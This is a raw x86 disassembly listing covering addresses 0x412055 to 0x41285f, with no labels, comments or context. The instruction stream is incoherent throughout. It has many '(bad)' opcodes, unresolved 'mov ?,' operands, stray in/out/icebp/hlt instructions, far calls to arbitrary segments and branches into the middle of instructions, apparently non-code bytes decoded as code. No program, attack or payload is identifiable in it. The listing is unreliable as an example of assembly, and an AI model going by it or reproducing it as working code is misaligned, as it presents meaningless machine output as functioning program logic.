  412055:	repz push ss
  412057:	jle    0x411fe1
  412059:	mov    ebp,0xbc73b77
  41205e:	es loop 0x412022
  412061:	mov    dl,0x25
  412063:	mov    al,ds:0x595aaa28
  412068:	enter  0x92a2,0x19
  41206c:	(bad)  
  41206d:	cli    
  41206e:	neg    dh
  412070:	loope  0x4120b3
  412072:	xchg   BYTE PTR [ecx],cl
  412074:	call   0xc62d:0x59c21482
  41207b:	add    edx,DWORD PTR [ebp+0x3556b11b]
  412081:	push   cs
  412082:	pop    ss
  412083:	pusha  
  412084:	into   
  412085:	sub    al,0xec
  412087:	sbb    DWORD PTR [esi+0x5a3f6712],0xe4ea48bc
  412091:	ror    dh,0x2e
  412094:	xchg   ecx,eax
  412095:	mov    ebp,0x4e939e14
  41209a:	jmp    0x41204e
  41209c:	and    esp,edx
  41209e:	pop    ds
  41209f:	js     0x4120ae
  4120a1:	scas   al,BYTE PTR es:[edi]
  4120a2:	adc    ch,BYTE PTR [edx+0x49c97e44]
  4120a8:	push   cs
  4120a9:	(bad)  
  4120aa:	cmp    al,0xfc
  4120ac:	loope  0x4120dc
  4120ae:	mov    ds:0xe6666126,al
  4120b3:	out    dx,al
  4120b4:	inc    ebp
  4120b5:	cdq    
  4120b6:	or     eax,DWORD PTR [ebp-0x299dbac3]
  4120bc:	nop
  4120bd:	inc    ebp
  4120be:	inc    edx
  4120bf:	test   al,0xf8
  4120c1:	xchg   edi,ebx
  4120c3:	repnz pop esi
  4120c5:	pop    esi
  4120c6:	jmp    0x4d4a:0x3e0b9735
  4120cd:	jecxz  0x412085
  4120cf:	std    
  4120d0:	ret    0x2864
  4120d3:	std    
  4120d4:	xor    eax,0x2efc1fe6
  4120d9:	faddp  st(2),st
  4120db:	mov    ecx,0xb424685f
  4120e0:	gs mov dl,dl
  4120e3:	call   0x9f83ea78
  4120e8:	inc    ecx
  4120e9:	sbb    al,0xcc
  4120eb:	js     0x41211e
  4120ed:	pop    esp
  4120ee:	xlat   BYTE PTR ds:[ebx]
  4120ef:	ret    
  4120f0:	retf   0xf607
  4120f3:	mov    WORD PTR [ecx+0x542642d4],ds
  4120f9:	ret    
  4120fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120fb:	sahf   
  4120fc:	sub    eax,0xba49694d
  412101:	push   ecx
  412102:	xchg   esi,eax
  412103:	and    BYTE PTR [edx],0x2c
  412106:	mov    esp,ebx
  412108:	or     al,0xc
  41210a:	mov    ebp,0xfa818267
  41210f:	shl    BYTE PTR [edx+0x10879b58],1
  412115:	aam    0xd
  412117:	arpl   dx,ax
  412119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41211a:	(bad)  
  41211c:	out    dx,al
  41211d:	xor    edx,DWORD PTR [esi-0x5b]
  412120:	xor    al,0x7b
  412122:	push   edx
  412123:	call   0x5d2224c0
  412128:	jle    0x4120e8
  41212a:	into   
  41212b:	mov    eax,ds:0x54ca38dc
  412130:	(bad)  
  412131:	fsubp  st(1),st
  412133:	inc    esi
  412134:	adc    eax,0xe7ec4b3
  412139:	jnp    0x412125
  41213b:	or     ecx,DWORD PTR [eax+ecx*4]
  41213e:	inc    ebx
  41213f:	loope  0x412116
  412141:	popa   
  412142:	dec    esi
  412143:	cmp    ecx,DWORD PTR [ebp+0x568845b4]
  412149:	xchg   edx,eax
  41214a:	or     edx,eax
  41214c:	mov    bh,0x1a
  41214e:	fcmovb st,st(4)
  412150:	mov    ecx,0x1b2890c
  412155:	outs   dx,BYTE PTR ds:[esi]
  412156:	mov    eax,ds:0x74aaffdd
  41215b:	push   edx
  41215c:	ret    0xa1a
  41215f:	cmp    BYTE PTR [ebp+0x2a],0x7c
  412163:	pop    eax
  412164:	ficom  WORD PTR [eax]
  412166:	(bad)  
  412167:	pop    sp
  412169:	or     eax,0x26c1beaf
  41216e:	daa    
  41216f:	aad    0xb5
  412171:	cmp    al,0xa3
  412173:	mov    bh,0xe
  412175:	out    dx,eax
  412176:	(bad)  
  412177:	or     BYTE PTR [ebp+0x30258b20],dl
  41217d:	(bad)  
  41217f:	adc    ch,BYTE PTR [esi+0x3a]
  412182:	and    ebx,DWORD PTR [edi]
  412184:	repnz sbb BYTE PTR [ecx-0x5],al
  412188:	inc    esp
  412189:	xchg   BYTE PTR [esi+0x702ea37c],cl
  41218f:	jmp    0x4121b1
  412191:	sbb    eax,0xffffffa8
  412194:	out    dx,eax
  412195:	repz xor dh,BYTE PTR [ebp-0x5b2d8bf4]
  41219c:	bound  eax,QWORD PTR [esp+edi*1+0x4fa80763]
  4121a3:	pop    ebp
  4121a4:	out    dx,eax
  4121a5:	arpl   WORD PTR [esi-0x31bfd8af],cx
  4121ab:	call   0x8eaec9fa
  4121b0:	in     eax,dx
  4121b1:	je     0x41217e
  4121b3:	mov    ch,0x3f
  4121b5:	loopne 0x41222d
  4121b7:	hlt    
  4121b8:	daa    
  4121b9:	inc    edi
  4121ba:	pop    es
  4121bb:	rcr    BYTE PTR [ecx],1
  4121bd:	cld    
  4121be:	jmp    FWORD PTR [edi]
  4121c0:	and    BYTE PTR [esi+0x16151a4b],dl
  4121c6:	aad    0xfc
  4121c8:	ror    BYTE PTR [edi+ebx*4],0xea
  4121cc:	loope  0x412242
  4121ce:	push   0xffffffdd
  4121d0:	jne    0x41223c
  4121d2:	call   0x7d4e:0x6d7f7e58
  4121d9:	lods   al,BYTE PTR ds:[esi]
  4121da:	push   ds
  4121db:	jo     0x4121dc
  4121dd:	push   edx
  4121de:	or     ebp,DWORD PTR [edi]
  4121e0:	in     eax,dx
  4121e1:	mov    ch,0xa1
  4121e3:	sbb    edx,DWORD PTR [edi-0x212c014a]
  4121e9:	jns    0x4121ae
  4121eb:	inc    edi
  4121ec:	mov    edi,0xb5c5986d
  4121f1:	mov    ebp,0x6f111376
  4121f6:	jg     0x412233
  4121f8:	cli    
  4121f9:	push   edx
  4121fa:	adc    cl,dl
  4121fc:	jno    0x412195
  4121fe:	inc    eax
  4121ff:	rol    dh,0x8e
  412202:	dec    edx
  412203:	xchg   ebx,eax
  412204:	cmc    
  412205:	inc    edx
  412206:	sar    BYTE PTR [edi-0x675c8e22],1
  41220c:	cli    
  41220d:	popf   
  41220e:	ja     0x4121e5
  412210:	and    edi,DWORD PTR [ecx+edi*4+0x3fe6aaa]
  412217:	jno    0x412294
  412219:	lods   al,BYTE PTR ds:[esi]
  41221a:	push   esi
  41221b:	and    bl,ch
  41221d:	jbe    0x4121ea
  41221f:	or     BYTE PTR ds:0x7e682dbb,ah
  412225:	test   al,bl
  412227:	inc    DWORD PTR [edi]
  412229:	cmp    al,0x28
  41222b:	push   eax
  41222c:	loopne 0x41220e
  41222e:	push   esp
  41222f:	nop
  412230:	mov    ?,WORD PTR [edx-0x47]
  412233:	scas   eax,DWORD PTR es:[di]
  412235:	ins    BYTE PTR es:[edi],dx
  412236:	lods   al,BYTE PTR ds:[esi]
  412237:	pop    ebx
  412238:	cdq    
  412239:	pop    ecx
  41223a:	test   eax,0x9ca7f6fe
  41223f:	lods   eax,DWORD PTR ds:[esi]
  412240:	mov    ebp,0xc272b9d3
  412245:	add    BYTE PTR [eax],cl
  412247:	rol    edx,1
  412249:	js     0x412240
  41224b:	bnd call DWORD PTR [ebp+edi*1-0x7eba180e]
  412253:	xchg   esi,eax
  412254:	sbb    bh,BYTE PTR [edi]
  412256:	fwait
  412257:	push   0xb2ba987
  41225c:	xor    eax,0x95f2e397
  412261:	cmp    eax,0xedf52ed6
  412266:	mov    edi,0x4b5641ea
  41226b:	aaa    
  41226c:	xlat   BYTE PTR ds:[ebx]
  41226d:	(bad)  [eax-0x73]
  412270:	inc    eax
  412271:	sub    al,0x68
  412273:	in     al,0xea
  412275:	jo     0x4122b5
  412277:	or     ebp,ebx
  412279:	sti    
  41227a:	jl     0x412285
  41227c:	sahf   
  41227d:	mov    ds:0x831587c4,al
  412282:	mov    esp,0x17225fa
  412287:	in     al,dx
  412288:	cwde   
  412289:	mov    edi,0xcc777124
  41228e:	pushf  
  41228f:	pop    esp
  412290:	(bad)  
  412291:	pushf  
  412292:	push   esp
  412293:	sbb    esp,edx
  412295:	sbb    eax,eax
  412297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412298:	sub    ebp,DWORD PTR [edi]
  41229a:	int    0x6e
  41229c:	pop    es
  41229d:	hlt    
  41229e:	lock inc eax
  4122a0:	enterw 0x69cd,0xb9
  4122a5:	cli    
  4122a6:	mov    eax,0x32d7bac
  4122ab:	adc    al,0x62
  4122ad:	jne    0x4122db
  4122af:	or     dh,bl
  4122b1:	push   0xffffffc3
  4122b3:	ss jge 0x4122fe
  4122b6:	scas   al,BYTE PTR es:[edi]
  4122b7:	and    cl,BYTE PTR [edx+0x3]
  4122ba:	xchg   edx,eax
  4122bb:	icebp  
  4122bc:	sub    DWORD PTR [eax],0x48
  4122bf:	adc    DWORD PTR [edi+0x5bcf676e],0xffffffd6
  4122c6:	add    BYTE PTR [edi],0xe2
  4122c9:	xchg   ecx,eax
  4122ca:	xor    dh,BYTE PTR [edx+0x50]
  4122cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122ce:	add    eax,0xb297dee3
  4122d3:	ins    BYTE PTR es:[edi],dx
  4122d4:	fs loope 0x412274
  4122d7:	ret    0xd638
  4122da:	push   cs
  4122db:	mov    ch,0x9
  4122dd:	adc    DWORD PTR [edi+0x14dbbe6c],ecx
  4122e3:	sbb    ebx,DWORD PTR [esi-0x5ea64d5f]
  4122e9:	ss cwde 
  4122eb:	adc    al,BYTE PTR [esi+ecx*2-0x2fc1e976]
  4122f2:	retf   
  4122f3:	pushf  
  4122f4:	sub    al,0xe2
  4122f6:	mov    eax,ds:0xd5b3e62c
  4122fb:	iret   
  4122fc:	cmp    ah,BYTE PTR [esi]
  4122fe:	scas   eax,DWORD PTR es:[edi]
  4122ff:	lea    ebp,[eax-0x54dbc566]
  412305:	xchg   esi,eax
  412306:	jno    0x41232b
  412308:	jle    0x41235b
  41230a:	mov    ds:0x7d9e9430,al
  41230f:	sbb    eax,0xb0c5819b
  412314:	loope  0x4122ef
  412316:	cmp    edi,eax
  412318:	mov    ch,0xd
  41231a:	data16 test BYTE PTR [ebp-0x4a],bh
  41231e:	loop   0x4122f5
  412320:	sub    DWORD PTR [edx+0x39],eax
  412323:	inc    edi
  412324:	add    ebx,DWORD PTR [esi+0x36]
  412327:	mov    al,0xe1
  412329:	mov    bl,0x99
  41232b:	faddp  st(2),st
  41232d:	jge    0x412318
  41232f:	add    BYTE PTR [esi+0x4db66da],0x69
  412336:	bound  ebx,QWORD PTR [ecx-0x345358ff]
  41233c:	test   DWORD PTR [ebx-0x23],eax
  41233f:	in     al,0xc
  412341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412342:	mov    al,0xbc
  412344:	xor    eax,esp
  412346:	add    eax,DWORD PTR [esi+0x2c1db0fe]
  41234c:	repnz fwait
  41234e:	stc    
  41234f:	repz fwait
  412351:	cli    
  412352:	(bad)  
  412354:	add    BYTE PTR [ebx+0x56e84f41],0x24
  41235b:	jecxz  0x41230d
  41235d:	add    eax,0x827d7fec
  412362:	sbb    ah,al
  412364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412365:	inc    eax
  412366:	add    eax,DWORD PTR [ebx-0x5d]
  412369:	clc    
  41236a:	mov    ebx,0xf029daac
  41236f:	and    ch,BYTE PTR [esi-0x5a14b5c]
  412375:	sbb    bh,BYTE PTR [eax]
  412377:	pop    ebx
  412378:	jmp    0x41237f
  41237a:	mov    dh,0x9b
  41237c:	aas    
  41237d:	jp     0x41233e
  41237f:	push   0x30
  412381:	cmp    al,bl
  412383:	xchg   ecx,eax
  412384:	and    BYTE PTR [ecx],dh
  412386:	xor    DWORD PTR [ebx+edx*2+0x7],ecx
  41238a:	mov    WORD PTR [esi+0x66794889],gs
  412390:	rcr    BYTE PTR [ecx],cl
  412392:	repnz adc cl,BYTE PTR [edx+0x4c]
  412396:	ret    
  412397:	dec    edx
  412398:	jg     0x41239e
  41239a:	pop    ecx
  41239b:	jb     0x412342
  41239d:	imul   ebp,DWORD PTR [esp+0x55],0xa661f936
  4123a5:	popf   
  4123a6:	push   ebx
  4123a7:	pusha  
  4123a8:	inc    ecx
  4123a9:	loope  0x4123c6
  4123ab:	push   edx
  4123ac:	mov    al,0x33
  4123ae:	dec    edx
  4123af:	aas    
  4123b0:	sbb    DWORD PTR [esi-0x55],esp
  4123b3:	out    dx,al
  4123b4:	and    eax,0x3325532e
  4123b9:	push   esp
  4123ba:	push   ebp
  4123bb:	dec    ebx
  4123bc:	pop    edx
  4123bd:	ror    DWORD PTR [eax+0x104093c0],cl
  4123c3:	(bad)  
  4123c4:	pop    ebx
  4123c5:	xor    esi,DWORD PTR [edx+esi*8-0x52a6d47d]
  4123cc:	repz (bad)
  4123cf:	mov    al,BYTE PTR [ebx-0x4e]
  4123d2:	lea    ebx,[edx]
  4123d4:	add    eax,0x9e5bf7a2
  4123d9:	sub    al,0xfe
  4123db:	hlt    
  4123dc:	mov    ah,0x65
  4123de:	mov    eax,ds:0x1b6fadc4
  4123e3:	cmp    al,0xb7
  4123e5:	push   edi
  4123e6:	pop    esi
  4123e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123e8:	ins    BYTE PTR es:[edi],dx
  4123e9:	adc    eax,0x21c98b74
  4123ee:	or     ch,BYTE PTR [edi-0x4127d779]
  4123f4:	cs cwde 
  4123f6:	cmp    DWORD PTR [ebp+edx*1-0x5a],esi
  4123fa:	scas   al,BYTE PTR es:[edi]
  4123fb:	cmp    dl,BYTE PTR [esp+ecx*8]
  4123fe:	fmul   DWORD PTR [edi-0xf]
  412401:	jns    0x41239f
  412403:	sub    al,0x22
  412405:	adc    BYTE PTR [eax-0x9],ch
  412408:	lea    edi,[eax]
  41240a:	cli    
  41240b:	jnp    0x4123bb
  41240d:	cwde   
  41240e:	aam    0x25
  412410:	pop    eax
  412411:	jae    0x4123a0
  412413:	jae    0x4123fc
  412415:	and    al,0x45
  412417:	mov    edi,edx
  412419:	push   ebx
  41241a:	sub    eax,0xf4ae55f
  41241f:	shl    dl,0x61
  412422:	or     ebx,DWORD PTR [ebx+0x36]
  412425:	push   ds
  412426:	adc    cl,BYTE PTR [edx]
  412428:	dec    edx
  412429:	inc    ebp
  41242a:	popf   
  41242b:	mov    eax,0xcb08d61c
  412430:	inc    ebx
  412431:	fcom   st(7)
  412433:	shl    eax,1
  412435:	rcr    BYTE PTR [eax+0x23],1
  412438:	bound  ebx,QWORD PTR [esi]
  41243a:	mov    bl,0xdb
  41243c:	fld    QWORD PTR [ecx-0x22]
  41243f:	icebp  
  412440:	test   eax,0x980ecb2a
  412445:	repnz push ss
  412447:	jge    0x4123d2
  412449:	push   edx
  41244a:	mov    eax,ds:0x6957b62a
  41244f:	fld    QWORD PTR [edi]
  412451:	js     0x412439
  412453:	sub    eax,0x38b8eb1f
  412458:	sbb    BYTE PTR [ebx-0x7cbd985],dl
  41245e:	inc    edx
  41245f:	xchg   edi,eax
  412460:	and    al,0xe1
  412462:	mov    dl,0xee
  412464:	mov    ds:0xf177f21a,al
  412469:	(bad)  
  41246a:	cwde   
  41246b:	sub    eax,0x5063df2e
  412470:	mov    edi,0x3e87b3ee
  412475:	jmp    0x41244f
  412477:	fistp  QWORD PTR [edi+0x3f67b843]
  41247d:	gs call 0xd4ad:0xe4934712
  412485:	or     DWORD PTR [edi+ebp*8+0x1f],edi
  412489:	jl     0x41245c
  41248b:	sub    DWORD PTR [esi-0x2669475c],0x74
  412492:	aas    
  412493:	fld    DWORD PTR [esi+0x1]
  412496:	inc    edi
  412497:	mov    ?,WORD PTR [esi]
  412499:	adc    bl,BYTE PTR [eax+0xdee9a62]
  41249f:	cs aas 
  4124a1:	arpl   WORD PTR [ebx+0x2451141f],bp
  4124a7:	pushf  
  4124a8:	imul   ebx,ebp,0xe606988a
  4124ae:	dec    ecx
  4124af:	mov    ah,0xd8
  4124b1:	push   edx
  4124b2:	cli    
  4124b3:	pop    ebp
  4124b4:	sbb    esi,DWORD PTR [ebx]
  4124b6:	cmp    eax,0x11125757
  4124bb:	xor    ebp,DWORD PTR [edx]
  4124bd:	gs pop ebp
  4124bf:	pusha  
  4124c0:	mov    ah,0x8a
  4124c2:	inc    ebx
  4124c3:	mov    al,ds:0x106f0d79
  4124c8:	sub    eax,0xeb7b3b04
  4124cd:	add    BYTE PTR [edx-0x38794d3b],0x69
  4124d4:	int3   
  4124d5:	call   0xa281be23
  4124da:	jmp    0x4124f9
  4124dc:	xchg   BYTE PTR [eax+0x514d374c],dh
  4124e2:	xlat   BYTE PTR ds:[ebx]
  4124e3:	sti    
  4124e4:	xor    ch,ch
  4124e6:	(bad)  
  4124e7:	hlt    
  4124e8:	ds (bad) 
  4124ea:	popf   
  4124eb:	jmp    0x36e31839
  4124f0:	mov    ch,0x28
  4124f2:	gs add esi,ecx
  4124f5:	cmp    eax,DWORD PTR [ecx-0x2]
  4124f8:	inc    edx
  4124f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124fa:	add    eax,0x783c4c7
  4124ff:	fist   WORD PTR [edi-0x4f32f4a2]
  412505:	mov    bh,0x1d
  412507:	dec    eax
  412508:	sbb    al,BYTE PTR [ecx+edx*8+0x15]
  41250c:	fcom   QWORD PTR [edi]
  41250e:	(bad)
  412511:	shl    edi,0x3a
  412514:	xor    al,0xe
  412516:	nop
  412517:	sbb    BYTE PTR [ebx],ah
  412519:	call   0xc26e:0x4857f72c
  412520:	jle    0x412502
  412522:	sub    dh,dh
  412524:	inc    esp
  412525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412526:	pop    esi
  412527:	pop    edx
  412528:	jmp    0x4124d8
  41252a:	jne    0x41251c
  41252c:	xor    BYTE PTR [ecx+0x7d],bl
  41252f:	aam    0xbd
  412531:	dec    esi
  412532:	adc    esi,DWORD PTR [ebx+0x44]
  412535:	xchg   BYTE PTR [ebx-0x2e7a09f3],al
  41253b:	call   0x3e65:0xce33b1b4
  412542:	jae    0x41254b
  412544:	out    dx,al
  412545:	inc    edi
  412546:	loope  0x412535
  412548:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412549:	sti    
  41254a:	fcmovne st,st(2)
  41254c:	in     al,dx
  41254d:	call   FWORD PTR [ebp-0x35]
  412550:	mov    edi,0x8dcedf9e
  412555:	xchg   BYTE PTR [esi+0x2d3ad515],dl
  41255b:	lea    ecx,[ecx+0x74f7f382]
  412561:	jmp    0x76c6:0xae02b467
  412568:	stc    
  412569:	push   0x19
  41256b:	stc    
  41256c:	mov    edx,0x7cc24fc1
  412571:	push   cs
  412572:	jle    0x41255d
  412574:	xchg   ebp,eax
  412575:	push   0x1e4a4ca8
  41257a:	sbb    eax,DWORD PTR es:[edx+0xeb6f582]
  412581:	pop    eax
  412582:	in     eax,dx
  412583:	mov    ds:0x9bd4aee0,al
  412588:	inc    edx
  412589:	mov    ds:0xcf7e7a49,eax
  41258e:	pop    ecx
  41258f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412590:	cmp    esi,esp
  412592:	jbe    0x412584
  412594:	sbb    al,bh
  412596:	mov    ds:0x56cd3589,al
  41259b:	int    0x9a
  41259d:	add    esi,DWORD PTR [eax+ebp*4-0x7d]
  4125a1:	mov    esi,ebp
  4125a3:	adc    al,0xc9
  4125a5:	sub    esp,DWORD PTR [edi]
  4125a7:	sbb    al,bh
  4125a9:	jmp    0x2de7:0x3bd584fb
  4125b0:	pop    esi
  4125b1:	dec    edi
  4125b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125b3:	ret    
  4125b4:	mov    gs,WORD PTR [edi]
  4125b6:	mov    es,esi
  4125b8:	sub    BYTE PTR [ecx+0x54784eee],ah
  4125be:	mov    ch,0xa6
  4125c0:	dec    edi
  4125c1:	fidivr DWORD PTR [edi+esi*1-0x7d]
  4125c5:	rcl    ah,cl
  4125c7:	out    dx,eax
  4125c8:	and    eax,eax
  4125ca:	adc    bl,BYTE PTR [ebp+0x1c5a6a52]
  4125d0:	jp     0x4125b1
  4125d2:	push   es
  4125d3:	in     al,0xb8
  4125d5:	xor    edi,edi
  4125d7:	jecxz  0x4125ba
  4125d9:	xor    al,0x9d
  4125db:	aas    
  4125dc:	jno    0x4125b5
  4125de:	sbb    bl,BYTE PTR [edx+0x69]
  4125e1:	sub    DWORD PTR [ebp+ebp*1-0x24879519],ecx
  4125e8:	ds inc edx
  4125ea:	shl    BYTE PTR [ecx-0x665ba497],1
  4125f0:	aas    
  4125f1:	outs   dx,DWORD PTR ds:[esi]
  4125f2:	add    eax,0x1f0a916a
  4125f7:	loop   0x41257c
  4125f9:	sbb    ebx,edx
  4125fb:	pop    esi
  4125fc:	mov    WORD PTR [edi-0x5a839813],?
  412602:	jb     0x41267e
  412604:	cs sahf 
  412606:	push   edi
  412607:	sbb    al,BYTE PTR [eax+0x66]
  41260a:	retf   
  41260b:	pop    edx
  41260c:	xor    ecx,DWORD PTR [eax]
  41260e:	shl    DWORD PTR [esi-0xe83e8bf],cl
  412614:	ds jbe 0x412598
  412617:	rcr    DWORD PTR [esi-0x6c],0x51
  41261b:	not    ah
  41261d:	push   eax
  41261e:	fld    QWORD PTR ds:0x93142e77
  412624:	rol    DWORD PTR ds:0xf2488526,cl
  41262a:	add    dl,BYTE PTR [esi]
  41262c:	cli    
  41262d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41262e:	push   0xffffff8d
  412630:	out    dx,al
  412631:	jge    0x4125f6
  412633:	mov    ds:0x6f08928c,eax
  412638:	push   0xfffffffe
  41263a:	jle    0x41263a
  41263c:	sub    al,0xd2
  41263e:	jg     0x4125ca
  412640:	xlat   BYTE PTR ds:[ebx]
  412641:	shl    BYTE PTR [edi+0x49],cl
  412644:	pop    ebx
  412645:	jnp    0x4126b3
  412647:	inc    ebx
  412648:	lea    ebp,[eax]
  41264a:	fild   DWORD PTR [esi-0x8]
  41264d:	jg     0x41266e
  41264f:	sbb    BYTE PTR [edi+0x7b75966a],cl
  412655:	jle    0x412662
  412657:	out    0x22,al
  412659:	dec    ebp
  41265a:	addr16 cmp esi,ecx
  41265d:	push   ebp
  41265e:	test   eax,0x200c9e2e
  412663:	fnsave [esp+edx*2+0x28ca113a]
  41266a:	mov    dh,0x3d
  41266c:	adc    ch,ch
  41266e:	add    BYTE PTR [ebx+esi*2],0x6d
  412672:	sub    bh,dh
  412674:	stc    
  412675:	pop    es
  412676:	pop    edx
  412677:	test   al,0x96
  412679:	pop    es
  41267a:	inc    esi
  41267b:	jg     0x41260d
  41267d:	mov    bh,0x87
  41267f:	aas    
  412680:	mov    BYTE PTR [ecx],0x2a
  412683:	in     eax,dx
  412684:	add    al,0x46
  412686:	addr16 jne 0x4126e7
  412689:	cdq    
  41268a:	cmp    ebx,esi
  41268c:	jmp    0xfd808734
  412691:	pushf  
  412692:	jecxz  0x4126a8
  412694:	add    ecx,esi
  412696:	jne    0x412662
  412698:	rcr    BYTE PTR ds:0x8efca429,cl
  41269e:	test   edx,ecx
  4126a0:	sub    al,cl
  4126a2:	inc    esi
  4126a3:	ins    DWORD PTR es:[edi],dx
  4126a4:	std    
  4126a5:	jnp    0x412715
  4126a7:	je     0x4126b0
  4126a9:	imul   ebx,esp,0xd948c12f
  4126af:	in     eax,dx
  4126b0:	and    ebp,ecx
  4126b2:	sub    al,0xd7
  4126b4:	adc    DWORD PTR [eax-0x37],ebp
  4126b7:	loope  0x412708
  4126b9:	aam    0x50
  4126bb:	sbb    al,0xf5
  4126bd:	inc    edx
  4126be:	or     esi,DWORD PTR [ecx-0x74]
  4126c1:	mov    al,ds:0xb41d8b1
  4126c6:	jle    0x412733
  4126c8:	cmp    DWORD PTR [ebx],0xeee121d6
  4126ce:	mov    BYTE PTR [ebx+0x585c85cf],dl
  4126d4:	jg     0x4126f4
  4126d6:	push   edi
  4126d7:	or     ebp,DWORD PTR [edx]
  4126d9:	ret    0x3cda
  4126dc:	jnp    0x412683
  4126de:	adc    eax,0xad5c1c03
  4126e3:	push   esp
  4126e4:	retf   
  4126e5:	and    ebp,DWORD PTR [edi+0x75691feb]
  4126eb:	sub    edi,DWORD PTR [edi]
  4126ed:	cmp    esp,DWORD PTR [ebp+0x3de7e7d9]
  4126f3:	and    ah,BYTE PTR [ebx+0x6816dcc2]
  4126f9:	dec    esp
  4126fa:	aam    0x34
  4126fc:	call   0x43c9:0x798f7bc6
  412703:	jg     0x4126c4
  412705:	xchg   ebx,eax
  412706:	pop    ss
  412707:	leave  
  412708:	adc    ebx,DWORD PTR cs:[edi-0x6d998a23]
  41270f:	push   ebp
  412710:	push   cs
  412711:	xor    BYTE PTR [ebx],ch
  412713:	outs   dx,DWORD PTR ds:[esi]
  412714:	je     0x412783
  412716:	mov    cl,dh
  412718:	push   0x701ff94
  41271d:	mov    dl,ah
  41271f:	stos   BYTE PTR es:[edi],al
  412720:	or     eax,DWORD PTR [edi]
  412722:	add    eax,0xaa41e1b4
  412727:	pop    esi
  412728:	leave  
  412729:	outs   dx,BYTE PTR ds:[esi]
  41272a:	imul   edi,DWORD PTR [ecx],0xffffffed
  41272d:	lods   al,BYTE PTR ds:[esi]
  41272e:	scas   eax,DWORD PTR es:[edi]
  41272f:	add    cl,BYTE PTR [ecx-0x2ce6975c]
  412735:	hlt    
  412736:	pop    ss
  412737:	pusha  
  412738:	mov    ebp,0xfeb24677
  41273d:	leave  
  41273e:	inc    ebx
  41273f:	sub    DWORD PTR [edi],edx
  412741:	imul   eax,edx,0xffffffa1
  412744:	sbb    DWORD PTR [edi+eiz*1+0x26],esp
  412748:	push   ebx
  412749:	inc    ebx
  41274a:	int    0x6d
  41274c:	cmp    eax,0xc9bcc980
  412751:	repnz retf 0xe1f4
  412755:	daa    
  412756:	mov    ecx,eax
  412758:	out    dx,al
  412759:	std    
  41275a:	cmp    DWORD PTR [ebx],esp
  41275c:	push   ebx
  41275d:	imul   DWORD PTR [eax-0x3cde03d0]
  412763:	pushf  
  412764:	sbb    ch,BYTE PTR [edx]
  412766:	sar    DWORD PTR [ebx-0x11],cl
  412769:	adc    cl,BYTE PTR [ebx-0x7a]
  41276c:	adc    bh,BYTE PTR [esi-0x57]
  41276f:	adc    ebx,ebx
  412771:	popa   
  412772:	aas    
  412773:	xor    eax,0xfc61b062
  412778:	dec    edi
  412779:	or     al,BYTE PTR [edx+0x23]
  41277c:	push   ds
  41277d:	sub    dl,dh
  41277f:	and    esi,DWORD PTR [edi]
  412781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412782:	xor    esp,DWORD PTR ds:0xcb4b72ae
  412788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412789:	imul   ecx,esp,0x35
  41278c:	std    
  41278d:	push   0xd7907715
  412792:	mov    esi,0x53682266
  412797:	pop    ss
  412798:	les    esp,FWORD PTR [edx]
  41279a:	mov    ds:0x1c48e2e6,al
  41279f:	popf   
  4127a0:	xchg   DWORD PTR [edi+0x5814c019],ebp
  4127a6:	rcl    BYTE PTR [esp+ebp*1-0x5b395bbd],0x10
  4127ae:	and    eax,0xe979c28a
  4127b3:	out    dx,al
  4127b4:	loop   0x412776
  4127b6:	xchg   esi,eax
  4127b7:	inc    edx
  4127b8:	fcom   QWORD PTR ds:0xa824108a
  4127be:	dec    eax
  4127bf:	in     eax,dx
  4127c0:	in     eax,dx
  4127c1:	cmovg  esi,DWORD PTR [esi-0x1]
  4127c5:	mov    ds:0x76df1f20,al
  4127ca:	sub    dh,al
  4127cc:	jo     0x41283c
  4127ce:	mov    bh,0x5b
  4127d0:	ds adc bl,bh
  4127d3:	call   FWORD PTR [ebx-0x27]
  4127d6:	xchg   ecx,eax
  4127d7:	pop    ebp
  4127d8:	arpl   bx,cx
  4127da:	or     DWORD PTR [edi+eiz*1],edi
  4127dd:	lea    esp,[ebx+0x1f6e63ee]
  4127e3:	jmp    DWORD PTR [ebp-0x10]
  4127e6:	pop    ebp
  4127e7:	imul   esi,DWORD PTR [eax+0xeb9397c],0x2f9d14bc
  4127f1:	retf   0xbdd1
  4127f4:	sub    DWORD PTR [edx-0x40acdb9],edi
  4127fa:	ret    
  4127fb:	or     edx,DWORD PTR [ecx-0x618b944e]
  412801:	dec    esp
  412802:	jmp    0x4127c9
  412804:	popf   
  412805:	scas   eax,DWORD PTR es:[edi]
  412806:	adc    bh,al
  412808:	je     0x41285e
  41280a:	lea    edx,[edi+0x61bdcd4b]
  412810:	push   0x4e476135
  412815:	add    bh,BYTE PTR [ebp+0xf]
  412818:	je     0x41288f
  41281a:	push   ecx
  41281b:	jbe    0x4127ef
  41281d:	inc    edx
  41281e:	(bad)  
  41281f:	out    dx,eax
  412820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412821:	mov    al,0x2
  412823:	sub    eax,0x5f9ead34
  412828:	adc    al,0x68
  41282a:	jp     0x4127bf
  41282c:	and    ch,dh
  41282e:	or     eax,esp
  412830:	or     eax,0x7871cf9a
  412835:	stc    
  412836:	jl     0x412839
  412838:	scas   eax,DWORD PTR es:[edi]
  412839:	and    eax,0x4c79452d
  41283e:	push   cs
  41283f:	fiadd  WORD PTR [ebx+0x21c6e8a]
  412845:	call   0x89863e71
  41284a:	je     0x412861
  41284c:	inc    eax
  41284d:	jno    0x41284c
  41284f:	test   BYTE PTR [ebx+0x709c2e6c],0x89
  412856:	lahf   
  412857:	dec    edx
  412858:	add    al,0xfb
  41285a:	sbb    al,0x8c
  41285c:	or     ebx,DWORD PTR cs:[ecx]
  41285f:	and    al,0x41
